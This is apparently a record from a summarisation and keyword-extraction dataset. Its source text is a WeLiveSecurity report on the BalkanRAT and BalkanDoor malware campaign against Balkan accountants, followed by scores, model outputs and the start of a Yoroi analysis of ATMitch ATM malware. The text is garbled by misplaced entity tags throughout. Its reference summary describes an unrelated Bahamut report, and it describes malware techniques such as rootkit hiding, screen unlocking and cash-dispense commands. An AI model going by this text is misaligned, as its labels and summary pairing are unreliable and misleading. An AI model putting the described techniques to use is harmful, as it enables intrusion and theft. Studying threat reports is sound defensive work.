for distribution of both BalkanRAT and [GPE] BalkanDoor mimic legitimate websites of of\ufb01cial institutions . Real domain [ORG] Chamber [ORG] of [ORG] Commerce [ORG] and [ORG] Industry [ORG] of [ORG] Serbia [ORG] Ministry [ORG] of [ORG] Finance of [GPE] Croatia , [ORG] Tax [ORG] AdministrationMalicious domain [ORG] pufbih[.]comTax [ORG] Administration [ORG] of [ORG] the [ORG] Federation [ORG] of [ORG] Bosnia [ORG] and [ORG] Herzegovina url decoy PDFs revolve around the tax theme2/188/15/2019In the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityLanguage [ORG] Content [ORG] Ponovljeni-Stav.pdf [ORG] Bosnian [ORG] Instructions for using tax \ufb01ling application Tax lawurl [CARDINAL] 2 . Decoy PDF documents3/188/15/2019In the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityMost often , the links leading to an executable \ufb01le are disguised as links to a [ORG] PDF . The executable \ufb01le is a WinRAR self - extractor with its name and icon changed to resemble a [ORG] PDF to fool the user . When executed , it is con\ufb01gured to unpack its content , open the decoy [ORG] PDF to prevent any suspicion \u2013 and silently execute either BalkanRAT or [GPE] BalkanDoor . In some of the latest samples of [ORG] BalkanDoor detected in [DATE] 2019 , the malware is distributed as an [ORG] ACE archive , disguised as a [ORG] RAR archive ( i.e. , not an executable \ufb01le ) , specially crafted to exploit the WinRAR [ORG] ACE vulnerability ( CVE-2018 - 20250 ) . This vulnerability , which has been remediated in version [CARDINAL] 5.70 released on [DATE] February [DATE] 28 [DATE] , [DATE] 2019 , is known to have been exploited quite often to distribute malware.thThe exploit - based deployment of [ORG] BalkanDoor is stealthier than in previous versions of the malware because it does not require executing the downloaded \ufb01le \u2013 an operation that might raise the intended victim \u2019s suspicions . The campaign According to our telemetry , most of the time , both tools have been deployed on the same machine . The combination of the tools gives the attacker both a command - line interface and a graphical interface to the compromised computer . In the case of the whole toolset being deployed on the machine , here is an example scenario for the attack : The attacker detects that the victim has their screen locked and thus , most probably , is not using the computer ( either via [ORG] BalkanDoor sending screenshot showing that computer is locked , or via the View Only mode of BalkanRAT ) . Via the [ORG] BalkanDoor backdoor , the attacker sends a backdoor command to unlock the screen \u2026 and using BalkanRAT , they can do whatever they want on the computer . However , even if the victim does not use their computer , the chance of them spotting the actions performed by the attackers is still there . Even with this disadvantage , using the RDS tool may be useful . The attacker is not limited by the commands shipped in the backdoor , or by their programming skills : manually , they can perform actions that would require writing a lot of code if a backdoor was the only tool available . In principle , the Balkan- toolset could be used for espionage , among other possible goals . However , not only the campaign \u2019s targets and distribution , but also our analysis of the Balkan- toolset tools show that the attackers are going after money instead of espionage . The [ORG] BalkanDoor backdoor does not implement any ex\ufb01ltration channel . Presumably , if the campaign were intended for espionage , the attackers would need an ex\ufb01ltration channel for uploading the collected data \u2013 at least as a backup to manual ex\ufb01ltration , which might not be always an option . On the contrary \u2013 and supporting the notion that the attackers \u2019 goal has been to commit some \ufb01nancial crime \u2013 we \u2019ve seen BalkanRAT dropping a tool that can list available smart cards , via the SCardListReadersA/ SCardConnectA API functions . [ORG] Smart cards are usually issued by banks or governments for con\ufb01rmation of the holder \u2019s identity . If misused , smart cards can facilitate illegal / fraudulent activities , e.g. digitally signing a contract , validating a money transaction etc.url the past , we \u2019ve seen this feature in [FAC] Operation [FAC] Buhtrap , a campaign targeting [NORP] Russian banks.4/188/15/2019In the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityAnalysis \u2013 BalkanDoor BalkanDoor is a simple backdoor with a small number of commands ( download and execute a \ufb01le , create a remote shell , take a screenshot ) . It can be used to automate tasks on the compromised computer or to automatically control several affected computers at once . We have seen [CARDINAL] six versions of the backdoor , ranging in supported commands , evolving since 2016.The initial dropper unpacks all components , opens a decoy [ORG] PDF ( in some cases ) and executes a batch installation script that ensures persistence of the backdoor . The backdoor registers itself as a service , under a legitimately - looking service name ( e.g. [PERSON] WindowsSvc , [GPE] WindowsPrnt , [ORG] WindowsConn or [ORG] WindowsErr ) ; the accompanying batch scripts can further ensure persistence by using Registry [PERSON] Run [PERSON] Keys or Startup folder . After the backdoor is installed , the computer connects to a [ORG] C&C server , identifying itself by the computer name and requesting the commands . The backdoor can connect to any of the C&Cs from a hardcoded list \u2013 a measure to increase resilience . It connects via the HTTP or HTTPS protocol ; if [ORG] HTTPS is used , then the server certi\ufb01cates are ignored . If the connection is not successful , the backdoor is capable of using the user - con\ufb01gured proxy on the victim \u2019s computer and repeating the connection attempt . The backdoor commands come in a format of an [ORG] INI \ufb01le , with properties determining the commands , command arguments and intended recipients . Specifying the list of recipients allows the attacker to send their commands to several compromised computers at once , e.g. to automatically take screenshots of all compromised computers . Commands du , ra , de , rpo rip scr_int , scr_dur [ORG] Capture a series of screenshots of the speci\ufb01ed durationFunctionality [ORG] Speci\ufb01es computer name(s ) of the intended recipients of the commands [PERSON] Download and execute a \ufb01le [PERSON] Download and execute a \ufb01le , in the speci\ufb01ed context and on a speci\ufb01ed desktop Create a remote shell accessible from the speci\ufb01ed [ORG] IP addressFurthermore , the backdoor itself can be executed in several modes , determined by the command line arguments with which it is executed . These modes themselves can serve as backdoor commands ( when executed from the remote shell):Argument [ORG] Functionality /instUnlocks the screen [PERSON] Creates a remote shell and redirects its input / output to the speci\ufb01ed [ORG] IP address [PERSON] Captures a series of screenshots , duration determined by other arguments Executes the speci\ufb01ed command using cmd.exe Executes the speci\ufb01ed command using cmd.exe , on the active ( input ) desktop [ORG] Installs itself as a service and starts the main procedure ( see /nosvc)url the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurity / start /nosvcStarts the associated service , which starts the main procedure ( see /nosvc ) Main payload , communicates with [ORG] C&C and interprets backdoor commandsAmong the [GPE] BalkanDoor capabilities , the most notable is passwordless screen - unlocking . This feature comes in handy to the attackers in cases when a logged - in user locks the computer . The \u201c Lock screen \u201d is just another Desktop for the system , so any malware with the necessary privileges can switch to a real desktop by command . No password is required to perform this operation . Figure [CARDINAL] 3 . Code responsible for unlocking the computer when the backdoor is executed remotely with an \u201c /unlock \u201d argumentAnalysis \u2013 BalkanRAT The BalkanRAT part of the malicious Balkan- toolset is more complex compared to its backdoor accomplice . Its goal is to deploy a copy of [ORG] the [ORG] Remote [ORG] Utilities software , which is commercial software by a [NORP] Russian vendor , [ORG] Remote [ORG] Utilities , [ORG] LLC , used for remote access to a computer or for remote administration . BalkanRAT also provides the attacker with the credentials needed for this remote access . BalkanRAT has several additional components to help load , install and conceal the existence of the RDS . They can add exceptions to the \ufb01rewall , hide the RDS \u2019s window and its tray icon , and hide the presence of related processes in the task manager.url the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityFigure [CARDINAL] 4 . Components used in the campaign to deploy and hide the presence of the [ORG] RDS1 . The dropper \ufb01rst unpacks all components ; a con\ufb01guration \ufb01le , the remote desktop softwareand a core component installing it , a userland rootkit , a [ORG] GUI hider and a decoy [ORG] PDF [ORG] \ufb01le.2 . The dropper opens the [ORG] PDF \ufb01le so as not to arouse suspicion of the user . [CARDINAL] 3 . Covertly , the dropper executes the core component ( 32 [QUANTITY] - bit ) in the installation mode . [CARDINAL] 4 . The core component ( 32 [QUANTITY] - bit ) installs itself to be executed with each start , and addsexception to the \ufb01rewall for the RDS . It executes commands inst1 and inst2 speci\ufb01ed in the con\ufb01guration \ufb01le , and executes itself again , now in stealth mode.5 . In this mode , the core component acts like a keylogger . [CARDINAL] 6 . The core component ( 32 [QUANTITY] - bit ) executes the [CARDINAL] 64 - bit version of itself , in injection mode ( [ORG] ifapplicable).7 . The core component ( [CARDINAL] 64 - bit ) injects the userland rootkit ( [QUANTITY] 64 [QUANTITY] - bit ) into task managerprocesses . The userland rootkit then hides presence of the malicious processes in the task manager.8 . The core component ( 32 [QUANTITY] - bit ) executes the RDS . It repeatedly monitors and hides the [ORG] RDSwindow ( because it is a [ORG] GUI application).9 . The core component ( 32 [QUANTITY] - bit ) injects the userland rootkit ( 32 [QUANTITY] - bit ) into task managerprocesses . The userland rootkit then hides presence of the malicious processes in the task manager.10 . The core component ( 32 [QUANTITY] - bit ) executes commands cmd1 and cmd2 , as speci\ufb01ed in the con\ufb01guration \ufb01le . [CARDINAL] One of such commands was seen executing a [ORG] GUI hider , which is an AutoHotKey script hiding the tray icon of the RDS.Note : Some components are optional . Also , sometimes they are deployed as a set comprising an encrypted payload and the corresponding loader . We are omitting these details . The con\ufb01guration \ufb01le of BalkanRAT is in [ORG] INI \ufb01le format ( similarly to [ORG] BalkanDoor , which uses this format for backdoor commands ) , with [CARDINAL] one section named [ CFG ] . The [ORG] INI \ufb01le is used by the malware \u2019 core component and the userland rootkit . url the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityCommands executed by the core component during installationinst1 , inst2 cmd1 , cmd2 [ORG] Command executed by the core component main payload [PERSON] List of processes that should be hidden by userland rootkit [PERSON] List of processes where userland rootkit is injectedFigure [CARDINAL] 5 . BalkanRAT \u2019s con\ufb01guration \ufb01le \u2013 properties ( top ) and example ( below)BalkanRAT \u2019s core is a multipurpose component ( there are both a 32 [QUANTITY] - bit and a [CARDINAL] 64 - bit versions ) ; it can be executed in various modes , determined by the command - line argument . Most signi\ufb01cantly , it is used for installation of BalkanRAT , launching a userland rootkit and adding exceptions for the RDS component in the \ufb01rewall . FunctionalityArgu\u2010 /sreg / instExecutes a batch \ufb01le Adds exception to the \ufb01rewall for the speci\ufb01ed program Sets con\ufb01guration data for the RDS in the registry ( especially email address where the credentials should be sent ) Ensures persistence by adding itself to the [ HKEY_CURRENT_USER\\SOFTWARE\\Mi\u2010 crosoft\\Windows NT\\CurrentVersion\\Windows ] registry key under the \u201c load \u201d entry . Adds exception for the RDS to the local \ufb01rewall . Executes itself again in the main mode ( no arguments ) . Injects the userland rootkit library into processes , as speci\ufb01ed in the con\ufb01guration \ufb01le / inj ( none ) Main mode . Executes the [CARDINAL] 64 - bit version of itself ( if applicable ) , injects the userland rootkit , executes the RDS and hides the window by changing its coordinates to values outside the screen . Another thread captures pressed keystrokes . The main part of the BalkanRAT malware is a copy of [ORG] the [ORG] Remote [ORG] Utilities software for remote access . Instead of using the of\ufb01cial version , BalkanRAT deploys a copy signed by a certi\ufb01cate of the attacker . The client side of the RDS running on the victim \u2019s computer must know the unique ID and the password , both generated on the server side , to connect to the server . The RDS deployed by BalkanRAT is con\ufb01gured in such a way that the password is the same for all victims , and the generated unique ID is sent to the attacker \u2019s email address by the tool itself . Since the tool [GPE] BalkanRAT misuses is legitimate , it leverages the genuine [ORG] Remote [ORG] Utilities \u2019 infrastructure for this communication ( rutils.com , server.rutils.com ) ; due to this , the communication may seem legitimate to the user \u2013 and to security products.url the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityAs a result , the attacker has obtained credentials to access the compromised computer via [ORG] the [ORG] Remote [ORG] Utilities software . Using this tool , they can broadcast the screen to monitor the activity of the user and manually take over the compromised computer . Figure [CARDINAL] 6 . A window the victim never sees . With a legitimate copy of [ORG] Remote [ORG] Utilities , thiswindow is visible ; however , BalkanRAT will hide it using the [ORG] GUI hider feature . To remain stealthy , BalkanRAT uses the [ORG] GUI hider feature . In most samples ( some older ones are an exception ) , it is implemented as an AutoHotKey script , compiled into an executable \ufb01le so that it can be run on a computer even if AutoHotKey is not installed there . The purpose of this script is to hide the tray icon of the RDS client . Figure [CARDINAL] 7 . AutoHotKey script embedded in the resource section of the executableAnother notable feature used by BalkanRAT to stay hidden is the ability to hide processes from the user.url the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityTo achieve this , userland rootkit libraries are injected in processes hardcoded in the con\ufb01guration \ufb01le . The userland rootkit hooks the NtQuerySystemInformation function for the process in which it is injected . In case SystemProcessInformation is queried , it \ufb01lters out all entries for processes with the names speci\ufb01ed in the con\ufb01guration \ufb01le . As a result , conventional task manager utilities will not display the processes the attackers want to keep hidden from the user . Figure [CARDINAL] 8 . With the userland rootkit injected , some processes are missing in the list ( left ) . Without the rootkit , the processesare visible ( right).Naturally , the list of processes that will be hidden contain mostly ones belonging to BalkanRAT . However , we have also seen names like \u201c weather.exe \u201d or \u201c preserve.exe \u201d in the list \u2013 which belong to the [ORG] BalkanDoor backdoor . This \ufb01nding supports the belief these [CARDINAL] two tools are indeed used Both BalkanRAT and [ORG] BalkanDoor have some interesting tricks up their sleeves and each of them separately pose a signi\ufb01cant risk to the victims . If used together as a toolset , they make an even more powerful weapon \u2013 the more the campaign we have discovered targets accounting , a function that is critical for organizations . The campaign targeting accountants in the [LOC] Balkans shows some similarities with a campaign aimed at [GPE] Ukrainian notaries reported in [DATE] 2016 . ( The only source we have been able to \ufb01nd describing it is in [LANGUAGE] Russian . ) In that case , the attackers \u2019 goal was to take control over a notary computer and issue some illegal operation on behalf of the notary . Just as attackers may con\ufb01rm a fraudulent transaction on behalf of a notary , they may perform a fraudulent transaction while impersonating a manager in a company \u2019s \ufb01nancial department . To stay safe , business users \u2013 and their employers \u2013 should follow basic cybersecurity rules : be cautious about emails and scrutinize their attachments and links , keep their software updated and use a reputable security solution . Indicators of Compromise ( [NORP] IoCs)url detection [ORG] names10/188/15/2019In the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityWin32 / [ORG] BalkanDoor . A Win32 / [ORG] BalkanDoor . B Win32 / BalkanRAT.A Win32 / BalkanRAT.B Win64 / BalkanRAT.A Win64 / BalkanRAT.B SHA-1BalkanDoor \u2013 executable \ufb01les BalkanRAT \u2013 executable and auxiliary \ufb01les url 6EF16FAA19FC4CEF66C4C1B66E58FB9CFFD8098E11/188/15/2019In the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurity730E20EE7228080A7F90A238D9E65D55EDD84301 Remote Utilities ( otherwise legitimate releases signed by attackers \u2019 certi\ufb01cates)url the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | [PERSON] WeLiveSecurity038ECEB80597DE438D8194F8F57245EB0239FF4B [PERSON] Decoy [PERSON] PDF \ufb01les Misused certi\ufb01catesurl the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityllc.amo- k@list.ru2015/07/302016/07/284E36C4D10F1E3D820058E4D45 valpak@mail.ru2016/04/102017/04/0117D50E2DBBAF5F8F60BF\u2010 FE1B90F4DD52FDB44A09Re\u2010 voked2016/08/222017/11/044A362020F1AFD3B\u2010 D0C67F12F55A5754D2E70338CRe\u2010 voked2017/11/052018/11/06936EDFB338D458F\u2010 [PERSON] LTD---2017/10/112018/10/12 [ORG] E7DF448539D1E2671D\u2010CF787CF368AAC2ED8F5698 fo2019/01/252019/12/18File namesBalkanDoor Dropper : Zakon.exe Backdoors : weather.exe , winmihc.exe , [ORG] Preserve.exe , PreservS.exe , WindowsConnect.exe Scripts : weather.cmd , winmihc4.cmd , [PERSON] mihcupdate.cmd [PERSON] Decoy [PERSON] PDF \ufb01le : Zakon.pdf BalkanRAT Droppers : ZPDGI.exe , [GPE] ZPDGV.exe , [GPE] ZPDGE.exe , ZPDGO.exe [GPE] , [GPE] ZPDGU.exe , [GPE] ZPDGA.exe , Ponovljeni-Stav.exe , AUG_1031.exe , [ORG] MIP1023.exe [ORG] Con\ufb01guration \ufb01le : stg.cfg [PERSON] Decoy [PERSON] PDF \ufb01les : ZPDG.pdf , Ponovljeni-Stav.pdf , AUG_1031.pdf , [ORG] MIP1023.pdf [ORG] Core component : winchk32.exe , wininit.exe , hide.exe , winchk64.exe RDS : rutserv.exe , rfusclient.exe [GPE] Userland rootkit : winmmon.dll , winmmon64.dll [ORG] GUI hider components : serk.bat , [GPE] serk.exe [GPE] Folder names % WINDIR%\\1B20F6AA-6CAD-45A7 [PERSON] - [PERSON] 81CB-120FB86FECD8 [PERSON] % WINDIR%\\29D451CF-3548 - 4486 - 8465 - A23029B8F6FA % WINDIR%\\B1EDD68E-6AD8 - 4A7E-91A1 - 3C30903B8DD4 % APPDATA%\\1B20F6AA-6CAD-45A7 - [PERCENT] 81CB-120FB86FECD8 [PERCENT] % APPDATA%\\29D451CF-3548 - 4486 - 8465 - A23029B8F6FA % APPDATA%\\B1EDD68E 6AD8 [CARDINAL] 4A7E 91A1 3C30903B8DD4url the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | [CARDINAL] WeLiveSecurityC&C servers url url url url url url url url url url url url url url url url [PERSON] Email addresses used to ex\ufb01ltrate [ORG] Remote [ORG] Utilities credentials b.klokov@inbox.ru galkin.valentin.83@bk.ru gligorijmaskov@mail.ru ivan.aslanov@newmail.ru ivan.tatarov@qip.ru melikov.viktor@yandex.ru mr.aleksandrandreev@mail.ru test@bbportal.info tgerik@list.ru vladzlobin@list.ru MITRE ATT&CK techniquesBalkanRATInitial tionT1192 Spearphish\u2010ing LinkBalkanRAT is distributed via emails that contain links to malware . T1059 [ORG] Command [ORG] - Line [ORG] Interface T1106 Executionthrough APIT1064 ScriptingBalkanRAT uses cmd.exe to execute \ufb01les . BalkanRAT uses ShellExecuteExW and LoadLibrary APIs to ex\u2010 ecute other malware components . BalkanRAT uses batch scripts for malware installation and execution.url the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityT1204 UserExecutionT1060 Registry Run T1134 Access To\u2010 InjectionT1108 RedundantAccessT1014 RootkitT1143 Hidden WindowT1082 System In\u2010 CaptureT1056BalkanRAT relies on the victim to execute the initial in\ufb01ltration . The malware is disguised as [ORG] PDF documents with misleading names , in order to entice the intended victim to click on it . BalkanRAT uses the following [LOC] Registry [LOC] Run key to establish per\u2010 sistence : [ HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Win\u2010 dows NT\\CurrentVersion\\Windows ] , \u201c load \u201d . BalkanRAT is able to impersonate the logged - on user using Du\u2010 plicateTokenEx or ImpersonateLoggedOnUser APIs . BalkanRAT is digitally signed with code - signing certi\ufb01cates . BalkanRAT decrypts and decompresses some of its components . BalkanRAT is capable of adding exceptions to the local \ufb01rewall , using its [ORG] COM interface . BalkanRAT modi\ufb01es the [ HKEY_CURRENT_USER\\Software\\Usoris\\Remote Utilities\\Server\\Parameters ] registry key to store con\ufb01guration of the RDS Some components of BalkanRAT are compressed and then en\u2010 crypted by a XOR cipher . BalkanRAT injects a userland rootkit library into processes of task manager utilities . Operators of BalkanRAT have been seen deploying a [ORDINAL] second malicious tool ( [ORG] BalkanDoor ) to preserve remote access in case BalkanRAT is removed . BalkanRAT uses a userland rootkit that hooks the [ORG] NtQuerySys\u2010 [ORG] temInformation function to hide the presence of malicious processes . BalkanRAT uses [CARDINAL] 3 rd party remote desktop software and hides its window and tray icon in order to hide it from the user . BalkanRAT collects the computer name and the language set\u2010 tings from the compromised machine . BalkanRAT is capable of logging pressed keystrokes . T1219 Remote Ac\u2010 cess ToolsBalkanRAT has misused legitimate remote desktop software for remote access . Persis\u2010 trolBalkanDoorurl sionT1059 Com\u2010mand [ORG] - Line [ORG] APIT1203 Exploita\u2010tion for T1064 [PERSON] ScriptingT1035 [PERSON] ServiceExecutionT1204 UserExecutionT1050 NewService T1158 [PERSON] HiddenFiles and DirectoriesBalkanRAT uses cmd.exe to create a remote shell . BalkanRAT uses ShellExecuteExW and LoadLibrary APIs to exe\u2010 cute \ufb01les . [ORG] BalkanDoor can be distributed as an [ORG] ACE archive disguised as a [ORG] RAR archive , exploiting [ORG] CVE-2018 - 20250 vulnerability in WinRAR to execute malicious code . [ORG] BalkanDoor uses batch scripts for malware installation and execution . [ORG] BalkanDoor \u2019s backdoor can be executed as a service . BalkanDoor relies on the victim to execute the initial in\ufb01ltration . The malware is disguised as [ORG] PDF documents or [ORG] RAR archives with mis\u2010 leading names , in order to entice the intended victim to click on it . [ORG] BalkanDoor can be installed as a new service , mimicking legitimate Windows services . [ORG] BalkanDoor can be installed in the Registry Run key , or dropped in the [PRODUCT] Startup folder . [ORG] BalkanDoor is able to create a process under the security context of a different user , using DuplicateTokenEx , SetTokenInformation or [ORG] CreateProcessAsUserW APIs . [ORG] BalkanDoor is digitally signed with code - signing certi\ufb01cates . [ORG] BalkanDoor deletes \ufb01les with backdoor commands after the com\u2010 mands have been executed . [ORG] BalkanDoor sets attributes of its \ufb01les to [ORG] HIDDEN , SYSTEM and READONLY.BalkanDoor can be installed as a service with names mimicking le\u2010 gitimate Windows services . Operators of [ORG] BalkanDoor have been seen deploying a [ORDINAL] second mali\u2010 cious tool ( BalkanRAT ) to preserve remote access in case Balkan\u2010 Door is removed . [ORG] BalkanDoor collects the computer name from the compromised machine.8/15/2019In the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityT1192 Spearphis hing LinkBalkanDoor is distributed via emails that contain links to download malware . T1036 Mas\u2010queradingT1108 Redun\u2010 coveryurl\u2010 lectionT1113 Screen CaptureBalkanDoor can capture screenshots of the compromised [ORG] machine.17/188/15/2019In [ORG] the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityCom\u2010 ProtocolBalkanDoor uses ports [CARDINAL] 80 and [CARDINAL] 443 for [ORG] C&C communication . [ORG] BalkanDoor is capable of identifying a con\ufb01gured proxy server if one exists and then using it to make HTTP requests . [ORG] BalkanDoor can communicate over multiple [ORG] C&C hosts . [ORG] BalkanDoor uses HTTP or [ORG] HTTPS for network communication . [PERSON] Zuzana [PERSON] Hromcov\u00e1 [CARDINAL] 14 Aug 2019 - 11:30AMurl", "generated_text": "the Balkans; the malware; backdoor; a remote access trojan; cyberspies; attacks; January 2016; the attackers; the malware; a Windows service; remote desktop software; RDS; the control; the system; the backdoor; the attackers; a graphical interface; the computer; control; the attacker; the graphical interface; the malware; a command line; the user; information; the malware; the products; the campaign; targets; the region; early 2019; the campaign; attacks; the victims; espionage.", "ref_text": "<START-1>Here is a summary of the key points from the PDF: The PDF is a report by Bellingcat on an espionage threat actor group named Bahamut that targets the Middle East and South Asia regions. Bahamut conducts phishing campaigns using credential theft pages impersonating platforms like Google and Microsoft. They also develop custom Android malware posing as legitimate apps. The report provides an update since Bellingcat's previous publication, implicating Bahamut in surveillance operations likely motivated by counterterrorism interests. It establishes links between Bahamut and prior campaigns in South Asia documented by other researchers. Technical analysis is provided on the evolution of Bahamut's malware, including new capabilities in Windows and Android agents. The C2 infrastructure and similarities in tactics connect the campaigns. Targeting suggests an intimate understanding of Gulf state institutions. Bahamut has improved its operational security since previous reporting, using subdomain whitelisting and other evasion techniques. Recent phishing targets diplomatic, media and policy sectors across the Middle East, with lures crafted for an Arabic audience. The nature of Bahamut's activities, despite gaps in attribution, indicates a hacker-for-hire group providing cyber espionage capabilities to state interests in the region. The report concludes by highlighting the blurred lines between cybercrime and state-sponsored threats. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.34285714285714286, "gpt3/lexical/rouge_rouge2": 0.05221932114882506, "gpt3/lexical/rouge_rougeL": 0.17142857142857143, "gpt3/lexical/rouge_rougeLsum": 0.17142857142857143, "gpt3_generated_text": ["This article discusses a cyber attack campaign in the Balkans that has been ongoing since January 2016. The campaign uses two malicious tools, BalkanDoor and BalkanRAT, which are a backdoor and a remote access trojan, respectively. These tools allow the attackers to fully control the compromised computer through both a graphical interface and a command line. The campaign targets the financial departments of organizations in the Balkans region, with the theme of taxes being used in the emails and decoy PDFs. The campaign is financially motivated rather than espionage-based. The attackers distribute the malware through malicious emails that mimic legitimate websites of official institutions. The campaign has been active in Croatia, Serbia, Montenegro, and Bosnia and Herzegovina, with the most recent detections in July 2019. The malware has been digitally signed with various certificates to add legitimacy, and the attackers have used an exploit of the WinRAR ACE vulnerability for installation. The article provides details on the features and distribution of both BalkanDoor and BalkanRAT, and highlights the overlap in targets and tactics used by the attackers."]}, {"split_name": "test", "sample_id": "test_59", "prompt_text": "Extract the keywords: [CARDINAL] 5/8/2019ATMitch : New Evidence Spotted In The Wild \u2013 [PERSON] Yoroi [PERSON] BlogATMitch : New Evidence Spotted In The Wildblog.yoroi.company/research/atmitch-new-evidence-spotted-in-the-wildZLAB-YOROIMay 7 , [DATE] 2019Introduction In [DATE] the [DATE] \ufb01rst [DATE] days [DATE] of [DATE] April , our threat monitoring operations spotted a new interesting malware sample possibly active in the wild since [DATE] 2017 . Its initial triage suggests it may be part of an advanced attacker arsenal targeting the Banking sector , possibly related to the same [ORG] APT group [PERSON] Kaspersky [PERSON] Lab tracked [DATE] two [DATE] years [DATE] ago after the compromise of a [NORP] Russian bank , where a particular malware tool dubbed [ORG] ATMitch has been unveiled . In the past , this piece of malware was manually installed on the victim [ORG] ATM after a wide enterprise network intrusion , enabling the cyber - criminals to manipulate the cash - withdrawal process on The recent , unattended discovery of such kind of sample within the Info - Sec community led us to a deep dive into this particular malware tool , spearhead of a sophisticated cyber arsenal . Technical Analysis The executable sample is a [PRODUCT] PE32 x86 \ufb01le named \u201c tester.exe \u201d . It seems to be custom loader for the real malicious payload able to take control of the target machine . Sha256 ATMitch ATM malware Brief description [ORG] ATMitch initial loader [PERSON] Ssdeep1536 : sPNdY / P / r6aqTzN7gqJT/0vniPJiz3yUrvGkc+uylR : sPiz657gqJT/06xiT / vaVylTable [CARDINAL] 1 : Information about Dropper / Loader of ATMitchurl New Evidence Spotted In The Wild \u2013 [PERSON] Yoroi [PERSON] BlogThe static data about this sample reveal the sample has been compiled on [CARDINAL] 8th Oct 2017 , [DATE] months [DATE] later than the Kaspersky disclosure of the [ORG] ATMitch attack operation . This element is not enough to date the sample with 100 % accuracy due to possible tampering , anyway the other static details suggest the date could be genuine due to the absence of scrambled artifacts . Figure [CARDINAL] 1 : Payload as resource of the [ORG] LoaderWhen started , the executable creates a new folder on \u201c [ORG] C:\\intel \u201d and then starts inspecting all the running processes . It looks for a really particular one : \u201c fwmain32.exe \u201d . This lookup reveals how deeply environmental aware is this implant . In fact , the \u201c fwmain32 \u201d process is part of the software services produced by [ORG] Wincor [ORG] Nixdorf [ORG] International [ORG] GmbH , one of the major vendors providing retail and banking hardware such as ATMs.url New Evidence Spotted In The Wild \u2013 Yoroi BlogFigure [CARDINAL] 2 : Research of \u201c fwmain32.exe \u201d process by malwareOnce the \u201c fwmain32.exe \u201d process is found , the loader injects the actual payload in its own memory , infecting it . The payload [ORG] DLL , initially stored into the loader resources section , will be implanted into the target process using the \u201c SetThreadContext \u201d injection technique ( [ORG] Thread [ORG] Hijacking).url [ORG] New [ORG] Evidence [ORG] Spotted [ORG] In The Wild \u2013 Yoroi BlogFigure [CARDINAL] 3 : Complete Thread Hijacking \ufb02owThe \ufb01gure above shows the sample calls on the [ORG] OpenThread and the SuspendThread functions to pause the current execution . After allocating the right memory amount in the target process , it writes the shellcode target memory space using the [FAC] WriteProcessMemory function and sets up the new process context with SetThreadContext . Finally , using the [ORG] ResumeThread function the payload is able to start its malicious execution . When the loader succeeded to inject the payload into the \u201c fwmain \u201d process , it also shows a popup window reporting the outcome of the injection phases.url New Evidence Spotted In The Wild \u2013 Yoroi BlogFigure [CARDINAL] 4 : Prompt window reporting the log of the injection phase [ORG] ATMitch [ORG] ATM [ORG] malwareSha256 Threat Brief description [ORG] ATMitch payload Ssdeep768 : N / qZvnFW5PJizM5qy1ucRM7YNNsrGkc+uW9LMQDFd+MbfRprj : N/0vniPJiz3yUrvGkc+uylRTable [CARDINAL] 2 : Information about the payload ( [ORG] DLL contained as resource in the Dropper / Loader ) The injected [ORG] DLL has a very characteristic dependency : it requires the \u201c msxfs.dll \u201d . This library provides access to [ORG] the [ORG] EXtension [ORG] for [ORG] Financial [ORG] Service ( XFS ) API , the communication interface needed to interact with AMT components such as [ORG] PIN pad and cash dispenser . Again , this is a very particular dependency can only be resolved on special purpose Windows environment , like the [ORG] Wincor machines . Figure [CARDINAL] 5 : \u201c msxfs.dll \u201d , library required by malware to communicate with [ORG] ATM deviceThe malware is quite simple : it reads commands from a \ufb01le included into \u201c [ORG] c:\\intel \u201d folder and interacts with the [ORG] ATM drivers in order to retrieve information about the current amount and to dispense money at the right time . In the following screen is shown a function used to initiate the communication with the [FAC] PinPad and [ORG] Dispenser [ORG] ATM [ORG] components.url New Evidence Spotted In The Wild \u2013 Yoroi BlogFigure [CARDINAL] 6 : Discovering of PinPad and [PERSON] Dispenser componentsUsing the functions provided by \u201c msxfs.dll \u201d library , the malware can easily interact with these components . For example , using the [NORP] WFSExecute function it is possible to send [CARDINAL] one of the supported commands to the dispenser , like OPEN_SHUTTER or [ORG] OPEN_SAFE_DOOR.url [ORG] New [ORG] Evidence [ORG] Spotted [ORG] In [ORG] The [ORG] Wild [ORG] \u2013 [ORG] Yoroi [ORG] BlogFigure [ORG] 7 : Part of commands accepted by ATMIn the speci\ufb01c case , the malware uses the function to dispense money through the command WFS_CMD_CDM_DISPENSE , as shown in \ufb01gure : Figure [CARDINAL] 8 : Command \u201c WFS_CMD_CDM_DISPENSE \u201d used by malware to dispense moneyThe core of the malware is the following switch structure : after reading the new command from the speci\ufb01c \ufb01le , it compares the command code with the embedded ones , such as \u201c code [CARDINAL] 2 \u201d for retrieving information or \u201c code 7 \u201d for dispensing money.url New Evidence Spotted In The Wild \u2013 Yoroi BlogFigure [CARDINAL] 9 : Malware \u2019 switch structureMoreover , the malware provides a well - structured logging system : all actions are traced and logged into \u201c c:\\intel\\__log.txt \u201d . In relation to the action that needs to be logged , it is able to set a speci\ufb01c logging level ( FATAL , ERROR , DEBUG etc.).url New Evidence Spotted In The Wild \u2013 Yoroi BlogFigure [CARDINAL] 10 : Logging - level of the malware logging system Conclusion This recently discovered [ORG] ATMitch sample is one of the key assets used by advanced attackers during bank cyber - robberies , potentially even by the [LANGUAGE] 